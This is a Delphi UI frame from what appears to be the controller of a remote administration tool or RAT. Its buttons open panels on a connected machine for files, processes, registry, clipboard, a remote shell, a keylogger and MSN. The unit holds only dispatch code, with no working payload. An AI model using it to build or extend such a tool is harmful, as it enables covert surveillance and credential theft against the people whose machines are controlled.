unit UnitFrameAll;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, UnitMain, StdCtrls, sCheckBox, sLabel, ExtCtrls, VirtualTrees,
  sFrameAdapter, Buttons, sSpeedButton, UnitConexao;

type
  TFrameAll = class(TFrame)
    sWebLabel1: TsWebLabel;
    sWebLabel2: TsWebLabel;
    sWebLabel3: TsWebLabel;
    sWebLabel4: TsWebLabel;
    sWebLabel5: TsWebLabel;
    sWebLabel6: TsWebLabel;
    sWebLabel7: TsWebLabel;
    sWebLabel8: TsWebLabel;
    sWebLabel9: TsWebLabel;
    sWebLabel10: TsWebLabel;
    sWebLabel11: TsWebLabel;
    sWebLabel12: TsWebLabel;
    sWebLabel13: TsWebLabel;
    sWebLabel14: TsWebLabel;
    sFrameAdapter1: TsFrameAdapter;
    sSpeedButton1: TSpeedButton;
    sSpeedButton2: TSpeedButton;
    sSpeedButton3: TSpeedButton;
    sSpeedButton4: TSpeedButton;
    sSpeedButton5: TSpeedButton;
    sSpeedButton6: TSpeedButton;
    sSpeedButton7: TSpeedButton;
    sSpeedButton8: TSpeedButton;
    sSpeedButton9: TSpeedButton;
    sSpeedButton10: TSpeedButton;
    sSpeedButton11: TSpeedButton;
    sSpeedButton12: TSpeedButton;
    sSpeedButton13: TSpeedButton;
    sSpeedButton14: TSpeedButton;
    procedure sWebLabel1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    Owner: TComponent;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

implementation

{$R *.dfm}

uses
  UnitAll;

constructor TFrameAll.Create(aOwner: TComponent; ConAux: TConexaoNew);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  Owner := aOwner;
end;

procedure TFrameAll.sWebLabel1Click(Sender: TObject);
var
  i: integer;
begin
  if TFormAll(Owner).MainPanel.ControlCount > 0 then
  begin
    for I := 0 to TFormAll(Owner).MainPanel.ControlCount - 1 do
    if TForm(TFormAll(Owner).MainPanel.Controls[i]).Visible = True then
    TForm(TFormAll(Owner).MainPanel.Controls[i]).Close;
  end;

  i := -1;
  if (Sender is TsWebLabel) then i := (Sender as TsWebLabel).Tag else
  if (Sender is TSpeedButton) then i := (Sender as TSpeedButton).Tag;

  case i of
    0:
      FormMain.AbrirFileManager(Servidor);
    1:
      FormMain.AbrirProcessos(Servidor);
    2:
      FormMain.AbrirJanelas(Servidor);
    3:
      FormMain.AbrirServicos(Servidor);
    4:
      FormMain.AbrirRegistro(Servidor);
    5:
      FormMain.AbrirClipboard(Servidor);
    6:
      FormMain.AbrirProgramas(Servidor);
    7:
      FormMain.AbrirDispositivos(Servidor);
    8:
      FormMain.AbrirPortasAtivas(Servidor);
    9:
      FormMain.AbrirShell(Servidor);
    10:
      FormMain.AbrirDiversos(Servidor);
    11:
      FormMain.AbrirCHAT(Servidor);
    12:
      FormMain.AbrirKeylogger(Servidor);
    13:
      FormMain.AbrirMSN(Servidor);
  end;
end;

end.
